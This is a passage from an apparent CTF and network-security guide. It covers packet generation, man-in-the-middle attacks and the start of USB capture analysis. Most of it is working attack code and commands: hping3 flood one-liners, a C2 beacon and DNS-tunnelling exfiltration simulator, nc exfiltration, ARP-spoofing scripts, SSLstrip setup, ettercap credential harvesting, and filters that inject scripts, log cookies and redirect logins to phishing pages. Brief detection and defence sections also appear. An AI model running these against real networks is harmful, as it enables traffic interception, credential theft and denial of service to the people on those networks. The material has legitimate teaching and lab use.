from scapy.all import *
import random

def simulate_http_session(target_ip, target_port=80):
    """
    Simulate complete HTTP session with 3-way handshake
    """
    src_ip = "192.168.1.50"
    src_port = random.randint(1024, 65535)
    
    # SYN
    ip = IP(src=src_ip, dst=target_ip)
    syn = TCP(sport=src_port, dport=target_port, flags='S', seq=1000)
    syn_ack = sr1(ip/syn, timeout=2, verbose=0)
    
    if not syn_ack:
        return False
    
    # ACK
    ack = TCP(sport=src_port, dport=target_port, flags='A',
              seq=syn_ack.ack, ack=syn_ack.seq + 1)
    send(ip/ack, verbose=0)
    
    # HTTP GET
    http_request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
    push = TCP(sport=src_port, dport=target_port, flags='PA',
               seq=syn_ack.ack, ack=syn_ack.seq + 1)
    send(ip/push/Raw(load=http_request), verbose=0)
    
    # FIN
    fin = TCP(sport=src_port, dport=target_port, flags='FA',
              seq=syn_ack.ack + len(http_request), ack=syn_ack.seq + 1)
    send(ip/fin, verbose=0)
    
    return True

# Generate 100 HTTP sessions
for _ in range(100):
    simulate_http_session("192.168.1.100")
```

**Port Scanning Simulation**

```python
from scapy.all import *

def generate_port_scan(target_ip, port_range):
    """
    Generate SYN scan traffic
    """
    src_ip = RandIP()  # Random source IP
    
    for port in port_range:
        packet = IP(src=src_ip, dst=target_ip)/TCP(dport=port, flags='S')
        send(packet, verbose=0)
        # Small delay to avoid overwhelming
        time.sleep(0.01)

# Simulate scan of common ports
generate_port_scan("192.168.1.100", range(1, 1024))
```

**Malicious Traffic Patterns**

```python
from scapy.all import *
import time

def generate_c2_beacon(c2_server, interval=60):
    """
    Simulate C2 beaconing pattern
    """
    while True:
        # DNS query to C2 domain
        dns_query = IP(dst="8.8.8.8")/UDP(dport=53)/\
                    DNS(rd=1, qd=DNSQR(qname=f"{c2_server}"))
        send(dns_query, verbose=0)
        
        # HTTP beacon
        http_beacon = IP(dst=c2_server)/TCP(dport=80, flags='PA')/\
                      Raw(load="GET /beacon HTTP/1.1\r\nHost: {c2_server}\r\n\r\n")
        send(http_beacon, verbose=0)
        
        time.sleep(interval)

def generate_data_exfiltration(target_ip, data_size_mb=10):
    """
    Simulate data exfiltration via DNS tunneling
    """
    data = "A" * (data_size_mb * 1024 * 1024)
    chunk_size = 63  # Max label length in DNS
    
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        # Encode as subdomain
        query = f"{chunk}.exfil.malicious.com"
        packet = IP(dst="8.8.8.8")/UDP(dport=53)/\
                 DNS(rd=1, qd=DNSQR(qname=query))
        send(packet, verbose=0)
        time.sleep(0.1)
```

### Distributed Traffic Generation

**Parallel Generation with GNU Parallel**

```bash
# Generate traffic from multiple source IPs in parallel
parallel -j 10 hping3 -S -p 80 -a {} --flood 192.168.1.100 ::: \
    10.0.0.{1..10}

# Multiple protocols simultaneously
parallel ::: \
    "hping3 --icmp --flood 192.168.1.100" \
    "hping3 --udp -p 53 --flood 192.168.1.100" \
    "hping3 -S -p 80 --flood 192.168.1.100"

# Traffic generation from file of targets
parallel -a targets.txt -j 20 \
    "hping3 -S -p 80 -c 100 {}"
```

**Docker-Based Distributed Generation** [Inference]

```bash
# Create simple traffic generator container
cat > Dockerfile << 'EOF'
FROM ubuntu:latest
RUN apt-get update && apt-get install -y hping3 curl
COPY generator.sh /generator.sh
RUN chmod +x /generator.sh
CMD ["/generator.sh"]
EOF

cat > generator.sh << 'EOF'
#!/bin/bash
TARGET=$1
hping3 -S -p 80 --flood $TARGET
EOF

# Build and run multiple instances
docker build -t traffgen .
for i in {1..10}; do
    docker run -d traffgen 192.168.1.100
done
```

### Traffic Capture During Generation

**Simultaneous Generation and Capture**

```bash
# Start capture in background
tcpdump -i eth0 -w generated_traffic.pcap &
TCPDUMP_PID=$!

# Generate traffic
hping3 -S -p 80 -c 1000 192.168.1.100

# Stop capture
kill $TCPDUMP_PID

# Analyze generated traffic
tshark -r generated_traffic.pcap -q -z io,phs
```

**Real-Time Statistics**

```bash
# Generate with iperf while monitoring
iperf3 -c 192.168.1.100 -t 60 &

# Monitor in real-time
watch -n 1 'tshark -i eth0 -a duration:1 -q -z io,stat,1'
```

### CTF-Specific Traffic Generation

**Flag Insertion in Traffic**

```python
from scapy.all import *

def generate_traffic_with_flag(target_ip, flag):
    """
    Generate traffic with flag hidden in various locations
    """
    # Flag in ICMP payload
    icmp_pkt = IP(dst=target_ip)/ICMP()/Raw(load=flag)
    send(icmp_pkt, verbose=0)
    
    # Flag in DNS query
    dns_pkt = IP(dst="8.8.8.8")/UDP(dport=53)/\
              DNS(rd=1, qd=DNSQR(qname=f"{flag}.example.com"))
    send(dns_pkt, verbose=0)
    
    # Flag in HTTP User-Agent
    http_pkt = IP(dst=target_ip)/TCP(dport=80, flags='PA')/\
               Raw(load=f"GET / HTTP/1.1\r\nUser-Agent: {flag}\r\n\r\n")
    send(http_pkt, verbose=0)
    
    # Flag in TCP sequence numbers (encode as ASCII values)
    for char in flag:
        seq_num = ord(char) * 1000
        tcp_pkt = IP(dst=target_ip)/TCP(dport=80, seq=seq_num, flags='S')
        send(tcp_pkt, verbose=0)

generate_traffic_with_flag("192.168.1.100", "FLAG{hidden_in_traffic}")
```

**Normal vs Anomalous Traffic Mix**

```bash
# Generate baseline normal traffic
cat > generate_mixed_traffic.sh << 'EOF'
#!/bin/bash

# Normal HTTP browsing
while true; do
    curl -s http://192.168.1.100/page1.html > /dev/null
    sleep $((RANDOM % 10 + 5))
done &

# Normal DNS queries
while true; do
    dig @8.8.8.8 www.example.com +short > /dev/null
    sleep $((RANDOM % 30 + 10))
done &

# Insert anomalous traffic
sleep 60
# Port scan
nmap -sS -p 1-1000 192.168.1.100

# Exfiltration attempt
dd if=/dev/urandom bs=1M count=100 | nc 192.168.1.100 12345

# Wait for normal traffic generators
wait
EOF

chmod +x generate_mixed_traffic.sh
./generate_mixed_traffic.sh
```

---

## Important Related Topics

- **Traffic Analysis Post-Generation**: Baseline comparison, anomaly detection validation
- **IDS/IPS Evasion Techniques**: Fragmentation, timing manipulation, encoding
- **Performance Optimization**: Kernel tuning for high-volume traffic generation
- **Automated Testing Frameworks**: Integration with security testing pipelines

---

## Man-in-the-Middle Setup

A Man-in-the-Middle (MITM) attack positions the attacker between two communicating parties, allowing interception and manipulation of traffic. Successful MITM requires network positioning, traffic redirection, and packet forwarding.

### Network Prerequisites

**Interface configuration:**

```bash
# Identify network interfaces
ip link show
ifconfig

# Enable promiscuous mode (capture all packets)
ip link set eth0 promisc on
ifconfig eth0 promisc

# Verify promiscuous mode
ip link show eth0 | grep PROMISC
```

**IP forwarding (critical for transparent MITM):**

```bash
# Check current setting
cat /proc/sys/net/ipv4/ip_forward

# Enable IP forwarding (temporary)
echo 1 > /proc/sys/net/ipv4/ip_forward
sysctl -w net.ipv4.ip_forward=1

# Permanent (survives reboot)
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
sysctl -p

# Disable forwarding (stealth mode - causes DoS)
echo 0 > /proc/sys/net/ipv4/ip_forward
```

**[Inference]** Disabling IP forwarding during MITM will break connectivity for victims, potentially alerting them to the attack; this is typically undesirable unless performing a denial-of-service attack.

### Network Reconnaissance

**Identify targets and gateway:**

```bash
# Discover live hosts
nmap -sn 192.168.1.0/24
netdiscover -r 192.168.1.0/24 -i eth0

# Identify gateway
ip route show | grep default
route -n

# ARP table inspection
ip neigh show
arp -a

# Detailed network mapping
nmap -sV -O 192.168.1.0/24 -oA network_scan
```

**Identify high-value targets:**

```bash
# Find web servers
nmap -p 80,443,8080,8443 192.168.1.0/24

# Find database servers
nmap -p 3306,5432,1433,27017 192.168.1.0/24

# Find mail servers
nmap -p 25,110,143,587,993,995 192.168.1.0/24
```

### Layer 2 MITM Positioning

**MAC address manipulation:**

```bash
# View current MAC address
ip link show eth0
macchanger -s eth0

# Change MAC address (temporarily)
ip link set dev eth0 down
ip link set dev eth0 address 00:11:22:33:44:55
ip link set dev eth0 up

# Using macchanger
macchanger -r eth0  # Random MAC
macchanger -a eth0  # Random MAC, same vendor
macchanger -m 00:11:22:33:44:55 eth0  # Specific MAC
```

### Traffic Capture Setup

**Tcpdump for MITM logging:**

```bash
# Capture all traffic on interface
tcpdump -i eth0 -w mitm_capture.pcap

# Capture specific traffic
tcpdump -i eth0 -w http_capture.pcap 'tcp port 80'
tcpdump -i eth0 -w ftp_capture.pcap 'tcp port 21'

# Capture with filters (exclude your IP)
tcpdump -i eth0 -w clean_capture.pcap 'not host 192.168.1.100'

# Rotate capture files by size
tcpdump -i eth0 -w mitm_capture.pcap -C 100  # 100MB files

# Verbose capture with packet contents
tcpdump -i eth0 -w capture.pcap -v -X
```

**Wireshark live capture:**

```bash
# Command-line capture
wireshark -i eth0 -k &

# With display filter
wireshark -i eth0 -k -f "tcp port 80 or tcp port 443" &

# Save automatically
wireshark -i eth0 -k -w /tmp/capture.pcap &
```

### SSL/TLS Interception Setup

**SSLstrip (downgrade HTTPS to HTTP):**

```bash
# Installation
apt-get install sslstrip

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Redirect HTTP traffic to SSLstrip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Run SSLstrip
sslstrip -l 8080 -w sslstrip.log

# Monitor log in real-time
tail -f sslstrip.log

# Clean up
iptables -t nat -F
```

**[Inference]** SSLstrip effectiveness has decreased significantly due to HSTS (HTTP Strict Transport Security) adoption; many modern websites will not downgrade to HTTP even when SSLstrip is active.

**mitmproxy (interactive HTTPS proxy):**

```bash
# Installation
apt-get install mitmproxy

# Run transparent proxy
mitmproxy --mode transparent --showhost

# Set up iptables redirection
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Non-interactive mode (save to file)
mitmdump -w mitm_dump.pcap

# With scripting
mitmdump -s modify_response.py

# Web interface
mitmweb --mode transparent --web-host 0.0.0.0
```

**Example mitmproxy script (modify_response.py):**

```python
from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    # Modify response body
    if "text/html" in flow.response.headers.get("content-type", ""):
        flow.response.content = flow.response.content.replace(
            b"</body>",
            b"<script>alert('MITM');</script></body>"
        )
    
    # Log credentials
    if flow.request.method == "POST":
        print(f"[+] POST to {flow.request.url}")
        print(f"    Data: {flow.request.content.decode('utf-8', errors='ignore')}")
```

**Bettercap (modern MITM framework):**

```bash
# Installation
apt-get install bettercap

# Interactive mode
bettercap -iface eth0

# Inside bettercap console:
# Enable ARP spoofing
set arp.spoof.targets 192.168.1.100
arp.spoof on

# Enable packet sniffing
net.sniff on

# SSL stripping
set http.proxy.sslstrip true
http.proxy on

# Capture credentials
net.sniff.verbose true
set net.sniff.filter 'tcp port 80 or tcp port 443'

# Run caplet (script)
caplets.update
caplets.show
caplet.run http-req-dump
```

**Example Bettercap caplet (mitm-full.cap):**

```
# Enable IP forwarding
!echo 1 > /proc/sys/net/ipv4/ip_forward

# Set target
set arp.spoof.targets 192.168.1.100
set arp.spoof.internal false

# Enable modules
net.sniff on
arp.spoof on
http.proxy on
set http.proxy.sslstrip true

# Logging
set net.sniff.output /tmp/mitm_capture.pcap
set net.sniff.verbose true

# Events
events.stream on
```

## ARP Spoofing with arpspoof

ARP spoofing (ARP poisoning) sends forged ARP messages to associate the attacker's MAC address with the IP address of a legitimate network device, redirecting traffic through the attacker's machine.

### ARP Protocol Basics

ARP maps IP addresses to MAC addresses on local networks:

- ARP Request: "Who has IP X.X.X.X? Tell Y.Y.Y.Y"
- ARP Reply: "X.X.X.X is at MAC AA:BB:CC:DD:EE:FF"

**[Inference]** ARP has no authentication mechanism by design; any device can send ARP replies, making spoofing trivial on unprotected networks.

### arpspoof Tool Usage

**Installation:**

```bash
apt-get install dsniff
```

**Basic ARP spoofing syntax:**

```bash
# Spoof victim to believe you are the gateway
arpspoof -i <interface> -t <target_ip> <gateway_ip>

# Spoof gateway to believe you are the victim
arpspoof -i <interface> -t <gateway_ip> <target_ip>
```

**Bidirectional ARP spoofing (standard MITM):**

```bash
# Terminal 1: Poison victim's ARP cache
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Terminal 2: Poison gateway's ARP cache
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Terminal 3: Capture traffic
tcpdump -i eth0 -w arp_mitm.pcap host 192.168.1.100
```

**Mass ARP poisoning (spoof entire subnet):**

```bash
# Spoof all hosts to believe you are the gateway
arpspoof -i eth0 192.168.1.1

# Combined with packet capture
arpspoof -i eth0 192.168.1.1 & tcpdump -i eth0 -w mass_mitm.pcap
```

### Manual ARP Spoofing with Scapy

**Python script for precise control:**

```python
#!/usr/bin/env python3
from scapy.all import *
import time
import sys

def get_mac(ip):
    """Get MAC address for given IP"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered:
        return answered[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip, target_mac):
    """Send spoofed ARP reply"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, gateway_ip, target_mac, gateway_mac):
    """Restore original ARP table"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                 psrc=gateway_ip, hwsrc=gateway_mac)
    send(packet, count=5, verbose=False)

def main():
    if len(sys.argv) != 3:
        print("Usage: ./arp_spoof.py <target_ip> <gateway_ip>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    
    # Get MAC addresses
    print("[*] Getting MAC addresses...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print("[-] Could not find MAC addresses")
        sys.exit(1)
    
    print(f"[+] Target MAC: {target_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")
    print("[*] Starting ARP spoofing (Ctrl+C to stop)")
    
    try:
        packets_sent = 0
        while True:
            # Spoof target (tell target we are gateway)
            spoof(target_ip, gateway_ip, target_mac)
            
            # Spoof gateway (tell gateway we are target)
            spoof(gateway_ip, target_ip, gateway_mac)
            
            packets_sent += 2
            print(f"\r[*] Packets sent: {packets_sent}", end="")
            time.sleep(2)
    
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables...")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        print("[+] ARP tables restored")

if __name__ == "__main__":
    main()
```

**Execute:**

```bash
chmod +x arp_spoof.py
./arp_spoof.py 192.168.1.100 192.168.1.1
```

### Targeted ARP Spoofing Scenarios

**Intercept specific protocols:**

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start ARP spoofing
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &

# Capture HTTP only
tcpdump -i eth0 -w http_only.pcap 'tcp port 80 and host 192.168.1.100'

# Capture DNS
tcpdump -i eth0 -w dns_only.pcap 'udp port 53 and host 192.168.1.100'

# Capture FTP credentials
tcpdump -i eth0 -A 'tcp port 21 and host 192.168.1.100' | grep -E 'USER|PASS'
```

**Session hijacking setup:**

```bash
# ARP spoof
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &

# Capture cookies
tcpdump -i eth0 -A 'tcp port 80 and host 192.168.1.100' | grep -i cookie

# Or use Wireshark filter
wireshark -i eth0 -k -f "host 192.168.1.100" &
# Filter: http.cookie or http.set_cookie
```

### Detection and Defense

**Detect ARP spoofing (defender perspective):**

```bash
# Monitor ARP cache changes
watch -n 1 arp -a

# Detect duplicate MAC addresses
arp-scan --interface=eth0 --localnet | grep DUP

# Using arpwatch
apt-get install arpwatch
arpwatch -i eth0 -f /var/log/arpwatch.log

# Check for gratuitous ARP
tcpdump -i eth0 arp | grep 'is-at'
```

**Static ARP entries (defense):**

```bash
# Add static entry
arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff

# Verify
arp -a | grep 192.168.1.1
```

## Ettercap MITM

Ettercap is a comprehensive MITM framework with built-in ARP spoofing, packet filtering, protocol dissection, and plugin support. It provides both graphical and text-based interfaces.

### Installation and Setup

```bash
# Install Ettercap
apt-get install ettercap-graphical ettercap-text-only

# Verify installation
ettercap --version

# Configuration file location
/etc/ettercap/etter.conf
```

**Configure Ettercap:**

```bash
# Edit configuration
nano /etc/ettercap/etter.conf

# Key settings:
# Uncomment these lines for Linux:
# redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
# redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"

# Set uid/gid (run as specific user after startup)
ec_uid = 65534
ec_gid = 65534
```

### Text Mode (Command Line)

**Basic syntax:**

```bash
ettercap [OPTIONS] [TARGET1] [TARGET2]

# Target format:
# MAC/IP/PORTs
# Example: /192.168.1.100/80,443  (IP with specific ports)
```

**Common options:**

```bash
-T            # Text mode
-q            # Quiet mode
-i <iface>    # Network interface
-M <method>   # MITM method (arp, dhcp, icmp, etc.)
-P <plugin>   # Load plugin
-F <filter>   # Use filter
-w <file>     # Write to pcap file
-L <file>     # Log all traffic
-c            # Load only packet dissectors
```

**Standard ARP poisoning MITM:**

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP poison between target and gateway
ettercap -T -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# Capture to file
ettercap -T -q -i eth0 -M arp:remote -w ettercap_capture.pcap /192.168.1.100// /192.168.1.1//

# Target entire subnet
ettercap -T -i eth0 -M arp:remote /192.168.1.0-254// /192.168.1.1//
```

**MITM method variations:**

```bash
# ARP poisoning (one-way)
ettercap -T -i eth0 -M arp:oneway /192.168.1.100// /192.168.1.1//

# ARP poisoning (remote - bidirectional, most common)
ettercap -T -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# DHCP spoofing
ettercap -T -i eth0 -M dhcp:ip_pool,netmask,dns

# ICMP redirect
ettercap -T -i eth0 -M icmp:gw_ip /target//

# Port stealing (switch environment)
ettercap -T -i eth0 -M port:remote /target//
```

### Graphical Mode

**Launch GUI:**

```bash
ettercap -G

# Or specify interface directly
ettercap -G -i eth0
```

**GUI workflow:**

1. **Sniff → Unified sniffing** → Select interface (eth0)
2. **Hosts → Scan for hosts** → Discover network devices
3. **Hosts → Hosts list** → View discovered devices
4. **Select Target 1** (victim) → Add to Target 1
5. **Select Target 2** (gateway) → Add to Target 2
6. **MITM → ARP poisoning** → Check "Sniff remote connections"
7. **Start → Start sniffing**
8. **View → Connections** → Monitor live sessions

### Credential Harvesting

**Enable dissectors:**

```bash
# Text mode with dissectors
ettercap -T -q -i eth0 -M arp:remote -d /192.168.1.100// /192.168.1.1//

# Dissectors automatically extract:
# - HTTP credentials
# - FTP credentials
# - POP3/IMAP credentials
# - SSH usernames
# - SMB passwords
# - MySQL credentials
# - Many others
```

**Monitor credentials in real-time:**

```bash
# Log to file
ettercap -T -q -i eth0 -M arp:remote -L ettercap_log /192.168.1.100// /192.168.1.1//

# Output files created:
# ettercap_log.eci (info file)
# ettercap_log.ecp (packet content)

# Convert to readable format
etterlog -p -i ettercap_log.ecp

# Search for credentials
etterlog -i ettercap_log.ecp | grep -E 'USER|PASS|password|login'
```

### Plugin Usage

**List available plugins:**

```bash
ettercap -P list
```

**Common plugins:**

**autoadd** - Automatically add new hosts to target list:

```bash
ettercap -T -i eth0 -P autoadd -M arp:remote //
```

**chk_poison** - Check if ARP poisoning is working:

```bash
ettercap -T -i eth0 -P chk_poison -M arp:remote /192.168.1.100// /192.168.1.1//
```

**dns_spoof** - Resolve DNS to arbitrary IP:

```bash
# Edit DNS hosts file
nano /etc/ettercap/etter.dns

# Add entries:
# www.example.com A 192.168.1.50
# *.google.com A 192.168.1.50

# Run with plugin
ettercap -T -i eth0 -P dns_spoof -M arp:remote /192.168.1.100// /192.168.1.1//
```

**isolate** - Isolate a host from network:

```bash
ettercap -T -i eth0 -P isolate /192.168.1.100//
```

**remote_browser** - Render victim's web pages on attacker machine:

```bash
ettercap -T -i eth0 -P remote_browser -M arp:remote /192.168.1.100// /192.168.1.1//
```

**find_conn** - Find connections between two hosts:

```bash
ettercap -T -i eth0 -P find_conn
```

**find_ip** - Find IP address of a host by MAC:

```bash
ettercap -T -i eth0 -P find_ip
```

### Packet Filtering

Ettercap filters allow packet modification in real-time. Filters are written in a custom language and compiled.

**Filter syntax example (drop_telnet.filter):**

```c
if (ip.proto == TCP && tcp.dst == 23) {
    drop();
    msg("Telnet connection dropped\n");
}
```

**More complex filter (inject_html.filter):**

```c
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Nothing!");
        msg("Removed encoding header\n");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "</body>")) {
        replace("</body>", "<script>alert('Injected');</script></body>");
        msg("Injected JavaScript\n");
    }
}
```

**SSH password replacement filter (ssh_inject.filter):**

```c
if (ip.proto == TCP && tcp.dst == 22) {
    if (search(DATA.data, "password")) {
        replace("password", "hacked!!");
        msg("SSH password modified\n");
    }
}
```

**Compile and use filter:**

```bash
# Compile filter
etterfilter drop_telnet.filter -o drop_telnet.ef

# Use filter
ettercap -T -i eth0 -F drop_telnet.ef -M arp:remote /192.168.1.100// /192.168.1.1//
```

**Filter functions:**

```
search(DATA.data, "string")   # Search for string in packet
replace("old", "new")         # Replace string
drop()                        # Drop packet
kill()                        # Kill connection
inject("data")                # Inject data into stream
log(DATA.data, "file")       # Log packet data to file
msg("message")               # Print message to console
```

**Advanced filter with conditions:**

```c
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "GET")) {
        if (search(DATA.data, "login.php")) {
            replace("login.php", "phishing.php");
            msg("Redirected to phishing page\n");
        }
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "Set-Cookie:")) {
        log(DATA.data, "/tmp/cookies.log");
        msg("Cookie logged\n");
    }
}
```

### SSL/TLS Interception with Ettercap

**SSLstrip integration:**

```bash
# Terminal 1: Start Ettercap
ettercap -T -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# Terminal 2: Redirect HTTPS to HTTP
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Terminal 3: Run SSLstrip
sslstrip -l 8080 -w sslstrip.log

# Monitor
tail -f sslstrip.log
```

**Configure Ettercap for SSL dissection:**

```bash
# Edit etter.conf
nano /etc/ettercap/etter.conf

# Uncomment:
# remote_browser = 1
# redir_command_on = "iptables -t nat -A PREROUTING..."

# Restart Ettercap with SSL dissection
ettercap -T -i eth0 -M arp:remote -d /192.168.1.100// /192.168.1.1//
```

### Ettercap Scripting

**Ettercap can be scripted for automation:**

```bash
#!/bin/bash

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Set variables
IFACE="eth0"
TARGET="192.168.1.100"
GATEWAY="192.168.1.1"
LOGFILE="mitm_$(date +%Y%m%d_%H%M%S)"

# Start packet capture
tcpdump -i $IFACE -w ${LOGFILE}.pcap host $TARGET &
TCPDUMP_PID=$!

# Start Ettercap
ettercap -T -q -i $IFACE -M arp:remote -L $LOGFILE /$TARGET// /$GATEWAY// &
ETTERCAP_PID=$!

# Monitor for specific duration
sleep 300  # 5 minutes

# Cleanup
kill $ETTERCAP_PID
kill $TCPDUMP_PID

# Parse logs
etterlog -p -i ${LOGFILE}.ecp > ${LOGFILE}_parsed.txt
echo "Logs saved to ${LOGFILE}_parsed.txt"
```

### Advanced Ettercap Techniques

**Multi-target ARP poisoning:**

```bash
# Create target list file (targets.txt)
192.168.1.100
192.168.1.101
192.168.1.102

# Poison multiple targets
for target in $(cat targets.txt); do
    ettercap -T -q -i eth0 -M arp:remote /$target// /192.168.1.1// &
done

# Capture all traffic
tcpdump -i eth0 -w multi_mitm.pcap
```

**Protocol-specific interception:**

```bash
# HTTP only
ettercap -T -i eth0 -M arp:remote /192.168.1.100/80/ /192.168.1.1//

# HTTPS only
ettercap -T -i eth0 -M arp:remote /192.168.1.100/443/ /192.168.1.1//

# FTP only
ettercap -T -i eth0 -M arp:remote /192.168.1.100/21/ /192.168.1.1//

# Multiple ports
ettercap -T -i eth0 -M arp:remote /192.168.1.100/21,22,23,80,443/ /192.168.1.1//
```

**Connection hijacking:**

```bash
# In Ettercap GUI:
# 1. Start MITM attack
# 2. View → Connections
# 3. Select active connection
# 4. Right-click → Kill connection
# 5. Immediately establish your own connection with stolen session
```

**Downgrade attacks:**

```bash
# Force HTTP/1.0 (strip encoding)
etterfilter downgrade.filter -o downgrade.ef

# downgrade.filter content:
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "HTTP/1.1")) {
        replace("HTTP/1.1", "HTTP/1.0");
    }
    if (search(DATA.data, "Accept-Encoding:")) {
        replace("Accept-Encoding:", "Accept-Nothing!:");
    }
}

# Apply filter
ettercap -T -i eth0 -F downgrade.ef -M arp:remote /192.168.1.100// /192.168.1.1//
```

### Ettercap Troubleshooting

**Common issues and solutions:**

**"Cannot find appropriate plugin" error:**

```bash
# Check plugin directory
ls -la /usr/share/ettercap/ | grep plugins

# Verify plugin installation
apt-get install --reinstall ettercap-common
```

**ARP poisoning not working:**

```bash
# Verify IP forwarding
cat /proc/sys/net/ipv4/ip_forward  # Should be 1

# Check if etter.conf is properly configured
grep -v '^#' /etc/ettercap/etter.conf | grep -v '^$'

# Verify interface in promiscuous mode
ip link show eth0 | grep PROMISC

# Check firewall rules
iptables -t nat -L -n -v
```

**No credentials captured:**

```bash
# Ensure dissectors are enabled (-d flag)
ettercap -T -d -i eth0 -M arp:remote /target// /gateway//

# Verify traffic is flowing through your machine
tcpdump -i eth0 host 192.168.1.100 -c 10

# Check if HTTPS is being used (needs SSL stripping)
tcpdump -i eth0 -A 'host 192.168.1.100 and tcp port 443'
```

### Defensive Considerations

**Detect Ettercap/ARP poisoning:**

```bash
# Monitor for duplicate IPs
arp -a | awk '{print $4}' | sort | uniq -d

# Detect ARP storm
tcpdump -i eth0 arp -c 100 | wc -l

# Check for multiple MACs claiming same IP
tcpdump -i eth0 -n arp | grep 'is-at' | awk '{print $7, $NF}' | sort | uniq -c
```

**Static ARP tables (prevention):**

```bash
# Create static entries for critical hosts
arp -s 192.168.1.1 00:11:22:33:44:55  # Gateway
arp -s 192.168.1.10 aa:bb:cc:dd:ee:ff  # Server
```

**Network monitoring for MITM detection:**

```bash
# Install and run ARPwatch
apt-get install arpwatch
systemctl start arpwatch
tail -f /var/log/syslog | grep arpwatch

# XArp (alternative)
apt-get install xarp
xarp &
```

---

### Important Related Topics

- **IPv6 MITM attacks:** NDP spoofing, Router Advertisement flooding
- **DHCP attacks:** DHCP starvation, rogue DHCP servers
- **Port stealing:** CAM table overflow, switch manipulation
- **Wireless MITM:** Evil Twin, Karma attacks, WPA2 deauthentication
- **Traffic replay attacks:** TCP session replay, authentication bypass
- **Advanced packet crafting:** Scapy for custom protocol manipulation

---

# USB & Hardware Traffic

USB and hardware communication protocols generate specialized packet captures requiring distinct analysis techniques. These protocols encode human input devices, serial data transfers, and low-level hardware communications that often contain CTF flags or credentials.

## USB PCAP Analysis

USB packet captures contain layered protocol data including device enumeration, descriptor exchanges, and data transfers across different endpoint types.

### USB Protocol Structure

USB communications consist of:

- **Control transfers**: Device configuration/enumeration (Endpoint 0)
- **Interrupt transfers**: HID devices, low-latency data
- **Bulk transfers**: Mass storage, large data transfers
- **Isochronous transfers**: Audio/video streaming

### Initial USB PCAP Reconnaissance

```bash
# Basic USB traffic overview
tshark -r usb_capture.pcap -q -z io,phs

# Identify USB devices in capture
tshark -r usb_capture.pcap -Y "usb.src" -T fields \
    -e usb.src -e usb.dst | sort -u

# Extract device descriptors
tshark -r usb_capture.pcap -Y "usb.bDescriptorType == 0x01" \
    -T fields -e usb.idVendor -e usb.idProduct -e usb.bDeviceClass
```

**Device Class Identification:**

```python
from scapy.all import *

# USB device classes (relevant for CTF)
USB_CLASSES = {
    0x03: "HID (Human Interface Device)",
    0x08: "Mass Storage",
    0x0A: "CDC (Communications Device)",
    0x0E: "Video",
    0xFF: "Vendor Specific"
}

def analyze_usb_devices(pcap_file):
    """Identify USB devices present in capture"""
    
    # [Inference] Scapy USB support may be limited; tshark preferred
    output = os.popen(f'tshark -r {pcap_file} -Y "usb.bDeviceClass" '
                      f'-T fields -e usb.src -e usb.bDeviceClass '
                      f'-e usb.idVendor -e usb.idProduct').read()
    
    devices = {}
    for line in output.strip().split('\n'):
        if line:
            parts = line.split('\t')
            if len(parts) >= 4:
                src, dev_class, vendor, product = parts[:4]
                class_name = USB_CLASSES.get(int(dev_class, 16), "Unknown")
                devices[src] = {
                    'class': class_name,
                    'vendor': vendor,
                    'product': product
                }
    
    for src, info in devices.items():
        print(f"Device {src}: {info['class']} "
              f"(VID: {info['vendor']}, PID: {info['product']})")
```

### USB Endpoint Analysis

```bash
# List all endpoints with data transfers
tshark -r usb_capture.pcap -Y "usb.endpoint_address" \
    -T fields -e usb.src -e usb.endpoint_address -e usb.data_len | \
    awk '{if($3>0) print}' | sort -u

# Filter by specific endpoint (e.g., interrupt endpoint 0x81)
tshark -r usb_capture.pcap -Y "usb.endpoint_address == 0x81" \
    -T fields -e usb.capdata > endpoint_data.txt
```

### Extracting USB Data Payloads

```python
import os

